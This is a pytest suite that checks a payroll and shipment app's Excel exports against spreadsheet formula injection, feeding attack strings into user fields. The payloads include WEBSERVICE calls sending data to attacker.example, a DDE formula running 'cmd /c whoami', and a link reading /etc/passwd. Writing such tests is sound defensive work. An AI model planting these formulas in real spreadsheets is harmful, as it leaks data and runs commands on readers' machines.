"""A user typed value must never become a live formula in the exports.

openpyxl stores a string starting with '=' as a formula, which Excel executes on
the machine that opens the file and LibreOffice executes while converting to
PDF. These tests attack the API the way a user could and check the exports.
"""

import io
import re
import zipfile

import pytest

from helpers import http_date

pytestmark = pytest.mark.db

PAYLOAD = '=WEBSERVICE("http://attacker.example/leak")'


def formulas_of(response) -> list:
    archive = zipfile.ZipFile(io.BytesIO(response.data))
    xml = archive.read("xl/worksheets/sheet1.xml").decode()
    return re.findall(r"<f>([^<]*)</f>", xml)


def sheet_text_of(response) -> str:
    archive = zipfile.ZipFile(io.BytesIO(response.data))
    return archive.read("xl/worksheets/sheet1.xml").decode()


@pytest.fixture
def attacked_payroll(api):
    """A payroll whose text fields carry a formula in every place a user types."""
    driver_code = api.driver(driver_name=PAYLOAD, driver_surname="PEREZ")
    product_code = api.product(product_name=PAYLOAD)
    route_code = api.route(origin=PAYLOAD, destination=PAYLOAD)
    shipment_payroll_code = api.shipment_payroll()
    driver_payroll_code = api.driver_payroll(driver_code)
    api.shipment(
        driver_code,
        product_code,
        route_code,
        shipment_payroll_code,
        driver_payroll_code,
        driver_name=PAYLOAD,
        product_name=PAYLOAD,
        origin=PAYLOAD,
        destination=PAYLOAD,
        dispatch_code=PAYLOAD,
        receipt_code=PAYLOAD,
    )
    api.shipment_expense(driver_payroll_code, reason=PAYLOAD, receipt=PAYLOAD)

    return {
        "shipment_payroll_code": shipment_payroll_code,
        "driver_payroll_code": driver_payroll_code,
    }


def test_the_collection_excel_has_no_injected_formula(client, auth, attacked_payroll):
    response = client.get(
        "/api/shipments/export-excel"
        f"?shipment_payroll_code={attacked_payroll['shipment_payroll_code']}",
        headers=auth,
    )

    assert response.status_code == 200
    injected = [f for f in formulas_of(response) if "WEBSERVICE" in f]
    assert injected == []


def test_the_collection_excel_keeps_the_value_as_text(client, auth, attacked_payroll):
    response = client.get(
        "/api/shipments/export-excel"
        f"?shipment_payroll_code={attacked_payroll['shipment_payroll_code']}",
        headers=auth,
    )

    assert "WEBSERVICE" in sheet_text_of(response), "the value is kept, only as text"


def test_the_settlement_excel_has_no_injected_formula(client, auth, attacked_payroll):
    response = client.get(
        f"/api/driver-payroll/export-excel/{attacked_payroll['driver_payroll_code']}",
        headers=auth,
    )

    assert response.status_code == 200
    injected = [f for f in formulas_of(response) if "WEBSERVICE" in f]
    assert injected == []


def test_the_export_still_has_its_own_formulas(client, auth, attacked_payroll):
    """The fix must not disarm the formulas the export itself writes."""
    response = client.get(
        f"/api/driver-payroll/export-excel/{attacked_payroll['driver_payroll_code']}",
        headers=auth,
    )

    formulas = formulas_of(response)

    assert any(formula.startswith("ROUND(") for formula in formulas)
    assert any(formula.startswith("SUM(") for formula in formulas)


@pytest.mark.parametrize(
    "attack",
    [
        '=WEBSERVICE("http://attacker.example/x")',
        '=_xlfn.WEBSERVICE("http://attacker.example/x")',
        "=1+1",
        '=DDE("cmd","/c whoami","x")',
        "='file:///etc/passwd'#$Sheet1.A1",
        '=HYPERLINK("http://attacker.example","click")',
    ],
)
def test_no_attack_string_becomes_a_formula(client, auth, api, attack):
    driver_code = api.driver(driver_name=attack)
    product_code = api.product(product_name=attack)
    route_code = api.route(origin=attack)
    shipment_payroll_code = api.shipment_payroll()
    driver_payroll_code = api.driver_payroll(driver_code)
    api.shipment(
        driver_code,
        product_code,
        route_code,
        shipment_payroll_code,
        driver_payroll_code,
        driver_name=attack,
        product_name=attack,
        origin=attack,
        dispatch_code=attack,
    )

    response = client.get(
        f"/api/shipments/export-excel?shipment_payroll_code={shipment_payroll_code}",
        headers=auth,
    )

    for formula in formulas_of(response):
        assert attack.lstrip("=") not in formula
